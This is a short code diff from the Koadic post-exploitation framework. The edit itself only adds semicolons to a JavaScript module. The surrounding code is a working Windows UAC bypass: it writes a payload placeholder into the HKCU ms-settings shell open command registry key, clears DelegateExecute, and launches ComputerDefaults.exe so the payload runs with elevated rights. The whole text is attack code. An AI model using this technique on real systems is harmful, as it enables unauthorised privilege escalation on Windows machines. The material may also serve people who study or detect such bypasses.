@@ -1,8 +1,8 @@
 try
 {
     var path = 'Software\\Classes\\ms-settings\\shell\\open\\command';
-    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING)
-    Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING)
+    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING);
+    Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING);
 
     Koadic.shell.run("ComputerDefaults.exe", true);
 
